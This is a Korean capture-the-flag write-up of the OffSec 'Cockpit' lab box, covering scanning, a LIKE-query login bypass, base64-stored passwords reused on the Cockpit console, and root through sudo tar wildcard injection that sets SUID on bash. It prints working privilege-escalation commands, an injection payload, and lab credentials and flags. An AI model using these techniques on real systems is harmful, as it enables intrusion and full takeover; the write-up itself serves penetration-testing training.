---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/web/auth-bypass
  - tech/web/sqli
  - tech/db/mysql
  - tech/cred/reuse
  - tech/lin/sudo-abuse
  - tech/lin/wildcard
  - tech/lin/suid
type: machine
platform: pg
os: linux
ip: 192.168.150.10
domain: blaze.offsec
ports: [22, 80, 9090]
services: [http, ssh]
status: solved
manual_tags: true
tech_count: 9
---

> [!info] Cockpit — PG Practice / Linux(Ubuntu 20.04.6) / Intermediate / 플래그 2개
> **타겟** 1일차 `192.168.150.10` · 2일차 `192.168.161.10` (이틀에 걸쳐 붙었고 그 사이 박스가 재배포돼 IP 가 바뀌었다)
> **경로 요약** tcp/80 의 `login.php` → 로그인 쿼리가 `LIKE '%…%'` 라서 **아무 한 글자로 인증 통과** → 관리자 화면이 전 사용자 계정과 **base64 로 저장된 비밀번호**를 그대로 출력 → 디코딩한 `james` 자격증명으로 **tcp/9090 Cockpit 웹콘솔** 로그인(시스템 계정 인증) → 콘솔 내장 터미널로 `local.txt` → `sudo -l` 에 `tar … *` → **와일드카드 인젝션**으로 `/bin/bash` 에 SUID → 같은 터미널에서 `proof.txt`
> **박스 이름이 함정이다.** 9090 에서 도는 것은 Red Hat 계열 서버 관리 콘솔 **Cockpit** 이고, `searchsploit Cockpit` 이 뱉는 것은 대부분 **이름만 같은 PHP CMS "Cockpit CMS"** 다. 실제 침투 경로는 9090 이 아니라 tcp/80 의 자작 PHP 앱이었다.

## 0. 이 박스에서 배우는 것

- **제품명 충돌.** nmap 이 붙여준 이름을 그대로 `searchsploit` 에 넣으면 다른 제품의 익스플로잇이 나온다. 서비스 이름 → 벤더 → 버전 순으로 좁혀야 한다.
- **`LIKE` 로 만든 로그인 쿼리는 인증 우회다.** 인용부호를 깨지 않아도 와일드카드 의미론만으로 통과한다.
- **디렉터리 브루트포스가 무의미한 표적**을 구분하는 법. Cockpit 콘솔은 존재하지 않는 경로에도 200 을 돌려준다 — 6,833건의 200 을 만들고도 얻은 게 없었다.
- `sudo -l` 의 `tar … *` → GTFOBins **와일드카드 인젝션**. 그리고 sudoers 의 `*` 는 인자 자리에서 슬래시·공백까지 매칭하므로 **파일명 트릭 없이 옵션을 직접 넘겨도 통한다**.
- ⚠️ **Cockpit 의 브라우저 터미널로 읽은 플래그는 시험에서 0점이다.** 이 박스는 `local.txt` 도 `proof.txt` 도 그 터미널에서 읽었다 — 시험 기준으로는 **둘 다 0점**이다(5장·7장 참조).

**시험 출제 가능성** — 높다. "로그인 폼 → 평문/약한 인코딩 자격증명 → 같은 자격증명으로 관리 서비스 로그인 → `sudo -l` GTFOBins" 는 PG Intermediate 의 표준 골격이다. 변형은 base64 자리에 md5·ROT13·평문이 들어가거나, 9090 자리에 Webmin·Zabbix·phpMyAdmin·Portainer 가 들어가는 정도다.

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Thu Jun 25 10:22:34 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.150.10
Nmap scan report for 192.168.150.10
Host is up (0.067s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.150.10:9090/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   66.80 ms 192.168.45.1
2   66.76 ms 192.168.45.254
3   67.04 ms 192.168.251.1
4   67.18 ms 192.168.150.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 25 10:23:32 2026 -- 1 IP address (1 host up) scanned in 58.40 seconds
```

읽어야 할 줄은 셋이다.

`9090/tcp … Cockpit web service 198 - 220` — 서비스 이름이 곧 박스 이름이니 눈이 여기로 간다. 하지만 이 줄은 **버전을 하나로 못 박지 못하고 198~220 이라는 구간으로 준다.** nmap 이 배너에서 정확한 버전을 못 읽었다는 뜻이고, 특정 CVE 로 바로 가기에는 근거가 약하다.

`|_http-title: Did not follow redirect to https://…:9090/` — 9090 은 평문 요청을 **자기 자신의 https** 로 리다이렉트한다. 이후 이 포트를 건드릴 때는 `https://` 와 `-k`(자체서명) 를 전제해야 한다.

`80/tcp … |_http-title: blaze` — 제품명이 아니라 그냥 `blaze`. 알려진 CMS 가 아니라 **자작 페이지**일 가능성이 크고, 실제 침투 경로는 여기였다. 9090 이라는 화려한 미끼가 옆에 있어도 tcp/80 을 먼저 다 뒤지는 편이 옳았다.

### 서비스 식별 — 이름이 같은 다른 제품

nmap 의 `Cockpit web service` 는 [cockpit-project.org](https://cockpit-project.org/) 의 리눅스 서버 관리 웹콘솔이다. Ubuntu·RHEL 에 `cockpit` 패키지로 들어가고 **PAM 으로 시스템 계정을 인증**한다. 그런데 exploit-db 검색은 이렇게 나온다.

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit Cockpit
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration &  | multiple/webapps/50185.py
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Reque | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution     | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request For | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Fo | php/webapps/47305.py
---------------------------------------------- ---------------------------------
```

다섯 중 셋은 **Cockpit CMS**(agentejo/cockpit, PHP 헤드리스 CMS)로 완전히 다른 제품이고, 하나는 openITCOCKPIT 으로 또 다른 제품이다. 이 콘솔에 해당하는 것은 `Cockpit Version 234 - SSRF` 하나뿐인데 **v234 대상**이고 nmap 판정은 198~220 이라 범위 밖이다.

> [!tip] 이름이 흔한 단어면 벤더로 좁혀라
> `Cockpit`·`Portal`·`Console`·`Dashboard`·`Hub` 같은 서비스명은 exploit-db 에서 반드시 충돌한다. 검색 결과를 열기 전에 **제품 식별 줄**을 먼저 보고 같은 제품인지 확인하는 데 10초면 된다. 필드 이름은 고정돼 있지 않다 — `49397.txt` 는 `# Vendor Homepage: https://cockpit-project.org/` 로, `49390.txt` 는 `# Product: Cockpit CMS (https://getcockpit.com)` 로 적혀 있다. 둘 다 **첫 10줄 안**이다. 여기서 그걸 안 하고 다른 제품의 익스플로잇을 붙들었다(6장).

### 열거 — feroxbuster 9회

`~/.zsh_history` 를 세면 이 박스에 feroxbuster 를 **아홉 번** 돌렸다(ffuf 1회 별도). 9090 에 네 번, 1일차 tcp/80 에 한 번, 2일차 tcp/80 에 네 번. 건진 것은 **마지막 한 번뿐**이다. 앞의 여덟 번이 더 배울 게 많아서 6장에 따로 뺐다.

성공한 것은 2일차, tcp/80 에 소문자 워드리스트를 물린 것이다.

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ feroxbuster -u http://192.168.161.10:80/ -s 200 -t 200 -x php,html,txt,bak,zip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.161.10/
 🚩  In-Scope Url          │ 192.168.161.10
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      707l     4190w   598838c http://192.168.161.10/img/blaze.png
200      GET       65l      128w     1108c http://192.168.161.10/css/style.css
200      GET       28l       63w      769c http://192.168.161.10/login.php
200      GET      278l      506w     5366c http://192.168.161.10/css/index.css
200      GET       78l      321w     3349c http://192.168.161.10/
200      GET       29l       60w      477c http://192.168.161.10/css/type.css
200      GET       29l       85w      913c http://192.168.161.10/js/index.js
```

플래그 해설:
- `-s 200` — **200 만** 보고한다. 편하지만 **401/403/302 를 통째로 버린다.** 인증 게이트나 리다이렉트로 감춰진 경로는 이 설정으로는 절대 안 보인다. 실제로 이 스캔의 상태파일에는 `status_403s: 14` 가 기록돼 있는데 화면에는 한 줄도 안 나왔다.
- `-t 200` — 200 스레드. 뒤에서 보듯 이 박스에서는 **이 값이 오히려 독**이었을 가능성이 있다.
- `-x php,html,txt,bak,zip` — 확장자마다 요청이 한 번씩 더 나간다. 워드리스트 20만 단어 × 6 = 약 124만 요청이 예정된다(상태파일 `expected_per_scan: 1245774`).

`login.php` 하나가 이 박스의 전부다. `login` 은 `directory-list-2.3-medium.txt` 와 `directory-list-lowercase-2.3-medium.txt` **양쪽 모두 53행째**라 스캔 시작 몇 초 안에 요청된다.

## 2. 취약점 분석 — `LIKE` 로 만든 로그인

### 무슨 일이 일어났나

`login.php` 에 아무 값이나 넣으니 로그인이 통과하고, 관리자 화면이 전 사용자 목록을 그대로 뿌렸다.

![[Pasted image 20260626105312.png]]![[Pasted image 20260626105320.png]]

입력창에 들어간 것은 **한 글자씩**이다. 사용자명 칸에 글자 하나, 비밀번호 칸에 마스킹된 점 하나. 그 한 글자를 4배로 확대하면 둥근 몸통에 오른쪽 아래로 꼬리가 붙은 글리프라 `a` 로 읽히지만, 렌더링이 뭉개져 단정하지는 않는다 `[가정]`.

돌아온 화면:

| Username | Password |
|---|---|
| james | `Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=` |
| cameron | `dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy` |

출처: `파일보관/Pasted image 20260626105320.png`. 화면 하단에 `Logout` 링크와 `Admin Dashboard | blaze.offsec` 이 함께 찍혀 있다 — 즉 **세션이 실제로 발급됐다.** 단순히 에러 페이지가 데이터를 흘린 게 아니라 인증을 통과한 것이다.

### 왜 통했나 — 에러 메시지가 쿼리 모양을 알려준다

사용자명에 `'` 하나만 넣고 비밀번호는 비운 채 제출하자 MySQL 문법 에러가 그대로 화면에 떴다.

![[Pasted image 20260626105549.png]]

```
Error: You have an error in your SQL
syntax; check the manual that corresponds
to your MySQL server version for the right
syntax to use near '%' AND password like
'%%" at line 1
```

출처: `파일보관/Pasted image 20260626105549.png` (줄바꿈은 브라우저가 감싼 것). 마지막 `'%%"` 의 끝 문자는 확대해도 **작은따옴표 둘(`''`)인지 큰따옴표 하나인지 구분되지 않는다.** MySQL 은 오류 스니펫을 작은따옴표로 감싸므로 `''` 일 가능성이 높지만 단정하지 않는다.

여기서 두 가지가 한 번에 확정된다.

1. **주입 지점이다.** 인용부호가 쿼리로 그대로 흘러들어가 파서를 깨뜨렸다. DBMS 는 MySQL.
2. **쿼리가 `=` 가 아니라 `LIKE` 다.** 에러가 인용한 잔여 문자열 `'%' AND password like '%%'` 를 되짚으면 원본은 이런 모양이다.

```sql
SELECT ... WHERE username LIKE '%<입력>%' AND password LIKE '%<입력>%'
```

`LIKE '%x%'` 는 **부분일치**다. 한 글자짜리 입력이라도 그 글자가 어떤 행의 username 과 password 양쪽에 들어 있으면 그 행이 걸린다. `a` 를 넣었다면 `james` 에 `a` 가 있고 저장된 값 `Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=` 에도 `a` 가 있으므로 james 의 행 하나가 매칭되고, 그것으로 인증은 통과한다. 화면이 두 계정을 다 뿌린 것은 로그인 결과가 아니라 **대시보드가 별도로 전 사용자를 조회한 것**으로 보인다 `[가정]` — 소스를 확인한 기록이 없다.

입력을 아예 비우면 `LIKE '%%'` 가 되어 **모든 행**이 걸린다. `%` 한 글자를 넣어도 같다.

> [!note] `=` 를 `LIKE` 로 바꾸면 그 자체가 인증 우회다
> SQL 인젝션이 아니어도 성립한다. 페이로드도, 주석 문자도, 인용부호 탈출도 필요 없다 — **와일드카드 문자를 그냥 입력하면 된다.** 개발자가 "검색 기능을 만들다 로그인에도 같은 헬퍼를 썼다" 같은 이유로 나오는 실수고, 실무에서도 종종 보인다.
>
> 그래서 로그인 폼을 만나면 **`'` 를 넣기 전에** `%` 하나, 그리고 빈 값 제출을 먼저 해보는 게 싸다. 응답이 달라지면 `LIKE` 다.

### 비밀번호가 base64 로 저장돼 있다

`Y2FudHRvdWNo…` 는 눈으로도 base64 다 — 문자셋이 `A-Za-z0-9+/` 뿐이고 끝이 `=` 로 패딩돼 있다. Kali 에서 디코딩:

```bash
┌──(kali㉿kali)-[~/PG/Cockpit]
└─$ base64 -d 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI='
canttouchhhthiss@455152
```

Burp Decoder 로 둘을 한꺼번에 돌린 화면도 남아 있다.

![[Pasted image 20260626110833.png]]

| 계정 | 비밀번호 |
|---|---|
| james | `canttouchhhthiss@455152` |
| cameron | `thisscanttbetouchedd@455152` |

base64 는 암호화가 아니라 **인코딩**이다. 저장된 값이 곧 평문이므로 이건 크래킹이 아니라 되돌리기다.

## 3. Foothold — 자격증명 재사용으로 9090 Cockpit 로그인

Cockpit 콘솔은 자체 사용자 DB 를 두지 않고 **PAM 으로 호스트의 시스템 계정을 인증한다.** 웹앱 DB 에서 꺼낸 `james` 의 비밀번호를 그대로 넣으니 들어가졌다 — 즉 웹앱 비밀번호와 리눅스 계정 비밀번호가 같았다.

![[Pasted image 20260626111116.png]]

우상단 `james`, 호스트 `blaze`, `Ubuntu 20.04.6 LTS 실행 중`. 좌측 메뉴 맨 아래 **터미널**이 있다. Cockpit 은 로그인한 사용자 권한으로 도는 브라우저 셸을 기본 제공한다.

![[Pasted image 20260626111320.png]]

```
james@blaze:~$ ls
local.txt
james@blaze:~$ cat local.txt
e4461b92c770db29bb95ae433e3f73ac
```

출처: `파일보관/Pasted image 20260626111320.png`.

> [!danger] 이 화면으로 받은 플래그는 OSCP 에서 0점이다
> 시험 규정은 *"this includes any type of web-based shell"* 이다. **Cockpit 의 내장 터미널은 정확히 web-based shell 이다.** 브라우저 안에서 도는 이상 예외가 아니다.
>
> 그리고 이 박스는 여기서 끝나지 않는다 — **이후 `sudo -l`·권한상승·`proof.txt` 까지 전부 이 터미널 하나에서 진행됐다.** 뒤에 나오는 스크린샷들은 브라우저 크롬만 잘려 있을 뿐 같은 창이다(5장 참조).
>
> 이 박스에서는 그럴 필요조차 없었다. **tcp/22 가 열려 있고**(OpenSSH 8.2p1), Cockpit 이 PAM 으로 통과시킨 이상 같은 비밀번호가 SSH 에도 통한다. 시험이었다면 `ssh james@<타겟>` 으로 갈아탄 뒤 거기서 `cat local.txt` 를 했어야 한다.
> 다만 **이 박스에서 SSH 접속을 실제로 시도한 기록은 없다** — Kali 산출물에도 `~/.zsh_history` 에도 `ssh james@` 는 없다. 위 문장은 Cockpit 이 PAM 인증이라는 사실에서 나온 추론이다 `[가정]`.

## 4. 권한상승 — `sudo -l` 의 `tar … *`

### 열거

셸을 잡자마자 칠 것 중 첫 번째에서 끝났다.

![[Pasted image 20260626130129.png]]

```
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

출처: `파일보관/Pasted image 20260626130129.png`.

여기서 봐야 할 것은 두 개다.

**`tar`** — GTFOBins 의 sudo 항목에 올라 있는 프로그램이다. `env_reset` 와 `secure_path` 가 붙어 있어 `LD_PRELOAD` 계열은 막혀 있지만, `tar` 는 환경변수가 아니라 **자기 옵션으로 프로그램을 실행**하므로 무관하다.

**끝의 `*`** — 두 겹으로 위험하다.
- 셸 쪽: 명령을 입력할 때 `*` 는 **현재 디렉터리 파일명으로 확장**된다. `-` 로 시작하는 파일이 있으면 그게 tar 에게 **옵션**으로 전달된다.
- sudoers 쪽: sudoers 의 `*` 는 인자 자리에서 **공백과 슬래시를 포함해 아무 문자열이나** 매칭한다. 즉 이 규칙은 james 에게 `tar` 의 임의 옵션 사용을 허용한 것과 같다.

### 왜 그것이 root 가 되는가

GNU tar 의 `--checkpoint=N` 은 N 개 레코드마다 체크포인트를 찍고, `--checkpoint-action=exec=CMD` 는 그때마다 `CMD` 를 실행한다. tar 가 root 로 도니 `CMD` 도 root 로 돈다.

파일명을 옵션처럼 만들어 글로브에 태우는 방식:

```bash
james@blaze:~$ cd /tmp
james@blaze:/tmp$ echo 'chmod +s /bin/bash' > privesc.sh
james@blaze:/tmp$ touch -- '--checkpoint=1'
james@blaze:/tmp$ touch -- '--checkpoint-action=exec=sh privesc.sh'
james@blaze:/tmp$ sudo tar -czvf /tmp/backup.tar.gz *
privesc.sh
snap-private-tmp/
snap-private-tmp/snap.lxd/
snap-private-tmp/snap.lxd/tmp/
ssh-MMae8vAufv2u/
tar: ssh-MMae8vAufv2u/agent.2081: socket ignored
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-Pqb66f/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-apache2.service-Pqb66f/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-fwupd.service-iFThWh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-fwupd.service-iFThWh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-ModemManager.service-l1tS1f/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-logind.service-0vp5Lh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-resolved.service-pGOwNf/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timedated.service-bNWBoh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timedated.service-bNWBoh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-systemd-timesyncd.service-Ll8SPh/tmp/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-tieolh/
systemd-private-1c25937d4cfb4fd0b9e84c8d8e470646-upower.service-tieolh/tmp/
vmware-root_750-2957714542/
james@blaze:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0#
```

`touch -- '--이름'` 의 `--` 는 **touch 자신에게** "여기부터는 옵션이 아니라 파일명" 이라고 알리는 것이다. 빼면 touch 가 `--checkpoint=1` 을 자기 옵션으로 해석하고 `unrecognized option` 으로 죽는다.

출력에서 성공을 확인하는 법: 멤버 목록에 `privesc.sh` 는 있는데 **`--checkpoint=1` 과 `--checkpoint-action=…` 은 없다.** 두 파일이 아카이브 대상이 아니라 **옵션으로 소비됐다**는 뜻이고, 그게 곧 트릭이 먹혔다는 증거다. `--checkpoint` 만 있고 액션을 안 주면 tar 가 `Write checkpoint 1` 같은 줄을 찍는데, `--checkpoint-action=exec=` 를 주면 기본 echo 동작이 **대체**돼 그 줄이 사라진다 — 위 출력에 체크포인트 줄이 하나도 없는 것이 그것이다.

`chmod +s /bin/bash` 는 bash 에 SUID 를 붙인다. bash 는 SUID 로 실행될 때 기본적으로 유효 UID 를 버리지만 **`-p`(privileged) 를 주면 유지**한다. 그래서 `/bin/bash -p` 로 root 셸이 된다.

### 더 짧은 경로 — 파일명 트릭 없이

sudoers 의 `*` 가 인자 자리에서 아무 문자열이나 매칭하므로, 파일을 만들 것 없이 옵션을 직접 넘겨도 규칙에 걸린다. 같은 규칙을 Kali 에 복제해 확인했다(이 박스에서 실행한 것이 아니라, 규칙 문법이 이런 인자를 허용하는지 검증한 것이다).

```bash
┌──(kali㉿kali)-[~]
└─$ cat /etc/sudoers.d/ztest
nobody ALL=(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *

┌──(kali㉿kali)-[~]
└─$ sudo -u nobody /usr/bin/sudo -n -l /usr/bin/tar -czvf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=id
/usr/bin/tar -czvf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=id

┌──(kali㉿kali)-[/tmp]
└─$ sudo -u nobody /usr/bin/sudo -n /usr/bin/tar -czvf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=id /etc/hostname
/usr/bin/tar: Removing leading `/' from member names
/etc/hostname
uid=0(root) gid=0(root) groups=0(root)
```

대조군으로 아카이브 경로를 바꾼 `… /tmp/other.tar.gz x` 는 `sudo -l` 이 아무것도 출력하지 않았다 — 규칙에 안 걸린다는 뜻이니 위 매칭이 우연이 아니다.

근거는 `sudoers(5)` 의 Wildcards 절이다. `*` 는 "zero or more characters (including white space)" 를 매칭하고, 경로명과 달리 **명령행 인자에서는 슬래시도 매칭된다**고 명시돼 있다.

> [!tip] 그래서 `sudo -l` 을 볼 때 `*` 의 위치를 본다
> 규칙 끝에 `*` 가 있으면 **그 프로그램의 모든 옵션이 열려 있다**고 읽어라. GTFOBins 에서 그 프로그램의 `sudo` 항목이 요구하는 옵션을 그대로 붙이면 대개 끝난다. 파일명 트릭은 `*` 가 **없을 때**, 즉 인자가 고정돼 있고 글로브 확장만 통제할 수 있을 때 필요한 우회다.

## 5. 플래그

| 위치 | 값 | 어디서 읽었나 |
|---|---|---|
| `/home/james/local.txt` | `e4461b92c770db29bb95ae433e3f73ac` | Cockpit 웹 터미널 |
| `/root/proof.txt` | `fc0dcc22a87ad79ebf61dcece9b4ce0c` | Cockpit 웹 터미널 (아래 판정 참조) |
| `/root/flag2.txt` | `RWFzdGVyRWdn` → `EasterEgg` | 제출 대상 아님 |

```
james@blaze:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
flag2.txt  proof.txt  snap
bash-5.0# cat flag2.txt
RWFzdGVyRWdn
bash-5.0# cat proof.txt
fc0dcc22a87ad79ebf61dcece9b4ce0c
```

![[Pasted image 20260626135233.png]]

출처: `파일보관/Pasted image 20260626135233.png`.

`/root/flag2.txt` 는 제출 대상이 아니다. 값이 base64 라서 디코딩해 보면 정체가 드러난다.

```bash
┌──(kali㉿kali)-[~]
└─$ echo -n 'RWFzdGVyRWdn' | base64 -d
EasterEgg
```

PG 가 심어둔 이스터에그 파일이다. `/root` 에 플래그처럼 생긴 파일이 두 개 있으면 **제출 전에 디코딩·확인부터** 하는 게 맞다 — 32자 hex 가 아닌 것은 대개 플래그가 아니다.

> [!warning] 이 화면은 시험 증거로 두 번 실격이다
> 첫째, `whoami` 는 있지만 `hostname` 과 `ip a` 가 없다. 시험이라면 `whoami; hostname; ip a; cat proof.txt` 를 **한 화면에** 담아야 인정된다.
> 둘째, 그리고 이쪽이 더 크다 — **이 화면도 Cockpit 웹 터미널이다.** 브라우저 크롬이 잘려 있어 별도 셸처럼 보이지만, 프롬프트 `james@blaze` 의 글리프 비트맵이 **Cockpit UI 크롬이 그대로 찍힌** `Pasted image 20260626111320.png` 의 같은 문자열과 **픽셀 단위로 동일**하다(87×14px, 배열 완전 일치). 같은 렌더러·같은 폰트·같은 크기라는 뜻이다.
> 방증도 같은 방향이다 — `~/.zsh_history` 에 `ssh james@` 가 **0건**이고, `~/PG/Cockpit/` 에 리스너·리버스셸 산출물이 없으며, `sudo -l`·권한상승 1차 스크린샷도 같은 렌더러로 찍혔다. **두 플래그 모두 web-based shell 에서 나왔고 시험 기준으로는 둘 다 0점이다.**

## 6. 막혔던 지점 / 시행착오

원본 노트는 성공 경로만 담고 있었다. 아래는 Kali 산출물의 파일 mtime, `~/.zsh_history`, 그리고 노트에 붙지 않은 스크린샷에서 복원한 것이다.

> [!note] 시각의 출처와 한계
> `~/.zsh_history` 에는 **타임스탬프가 없다**(`~/.zshrc` 에 `extended_history` 미설정). 그래서 아래 시각은 전부 **파일 mtime 과 스크린샷 파일명**에서 왔다. 스크린샷 파일명은 볼트에 **붙여넣은 시각**이라 촬영 시각과 몇 초~몇 분 어긋날 수 있다.
> 또한 **Cockpit 브라우저 터미널 안에서 친 명령은 `~/.zsh_history` 에 한 줄도 남지 않는다.** 셸 이후 구간의 실측은 스크린샷이 유일하다.

| 시각 | 무슨 일 | 근거 |
|---|---|---|
| 06-25 10:22–10:23 | nmap 완료 | `nmap.log` |
| 06-25 10:41 | `49390.py` 마지막 편집 — searchsploit 우회로의 끝 | `49390.py` mtime |
| 06-25 11:12 | 9090 ferox 중단(Ctrl-C) — 이 시점의 상태만 `.state` 로 남았다 | `.state` mtime, 요청 66,771 / 예정 1,323,276 |
| 06-25 13:36 | 9090 ferox 마지막 회차 종료 — 200 응답 6,833건, 건진 것 0 | `ferox.txt` mtime·행수 |
| 06-25 15:32 | 1일차 80 ferox — 200 응답 **6건**, `login.php` **없음** | `ferox_80.txt` |
| 06-26 10:51 | 재배포된 IP 로 80 ferox 재시도 → `login.php` 발견 후 Ctrl-C | `.state` mtime·내용(`login.php` 가 발견 목록에 있고 루트 스캔은 `Running` 인 채로 저장됨) |
| 06-26 10:53–10:55 | 로그인 우회, 사용자 목록, `'` 로 MySQL 에러 | 스크린샷 3장 |
| 06-26 11:07–11:08 | base64 디코딩 | 스크린샷 2장 + history |
| 06-26 11:11–11:13 | Cockpit 로그인, `local.txt` | 스크린샷 2장 |
| 06-26 11:13→13:01 | **약 108분 공백. 기록이 없다** | — |
| 06-26 13:01 | `sudo -l` | 스크린샷 |
| 06-26 13:36 | 권한상승 페이로드 1차 — 폐기 | 스크린샷 |
| 06-26 13:52 | root, `proof.txt` | 스크린샷 |

### ① 이름만 같은 제품의 익스플로잇을 붙들었다

`Cockpit CMS 0.6.1 - Remote Code Execution`(EDB 49390) 을 받아 세 번 실행을 시도했다. history 에 남은 순서가 그대로다.

```
searchsploit Cockpit
searchsploit -m 49390
vi 49390.txt
mv 49390.txt 49390.py
python 49390.py
python2 49390.py
python 49390.py 192.168.150.10
vi 49390.py
```

이 블록은 history 상 `mkdir Cockpit` · `nnmap 192.168.150.10` **앞**에 있다. 즉 스캔도 하기 전에 **포털에 뜬 박스 이름만 보고 검색**한 것으로 읽힌다. 다만 `49390.py` 의 mtime 은 10:41:02 로 nmap 종료(10:23:32) 뒤다. `~/.zsh_history` 에 타임스탬프가 없어 둘을 조화시킬 수 없고, 확실한 것은 **10:41 까지 그 파일을 붙들고 있었다**는 것뿐이다.

두 번 틀렸다.

**첫째, 제품이 다르다.** Cockpit CMS 는 PHP 헤드리스 CMS 고, 타겟의 9090 은 리눅스 관리 콘솔이다. 이름만 같다. 박스 이름이 `Cockpit` 이라고 해서 9090 의 그 Cockpit 이라는 보장도 없다 — 실제 답은 tcp/80 이었다.

**둘째, 그 파일은 스크립트가 아니다.** `searchsploit -m 49390` 이 가져오는 것은 `49390.txt` 이고 내용은 산문 어드바이저리다.

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit -p 49390
  Exploit: Cockpit CMS 0.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49390
     Path: /usr/share/exploitdb/exploits/php/webapps/49390.txt
    Codes: N/A
 Verified: False
File Type: ASCII text
```

`File Type: ASCII text` 다. 파일 안에는 HTTP 요청 두 개와 설명 산문만 있다.

```
{"auth":{"user":"test'.phpinfo().'","password":"b"}}
```

여기서 눈에 띄는 게 history 3번째 줄의 `vi 49390.txt` 다. **한 번 열어보고서도** 확장자를 `.py` 로 바꾸고 `python` → `python2` → 인자 붙여서 세 번 실행을 시도했다. 훑고 넘겼거나, "exploit-db 에서 받은 건 실행하는 것" 이라는 관성이 앞섰다는 뜻이다. 마지막 `vi 49390.py` 에서야 손을 뗐다.

> [!warning] 확장자로도, 열어봤다는 사실로도 부족하다
> 같은 검색 결과의 `49397.txt`(Cockpit v234 SSRF)는 **확장자가 `.txt` 인데 내용은 완전한 python3 스크립트**다. 반대로 `49390.txt` 는 산문이다. exploit-db 의 확장자는 신뢰할 수 없다.
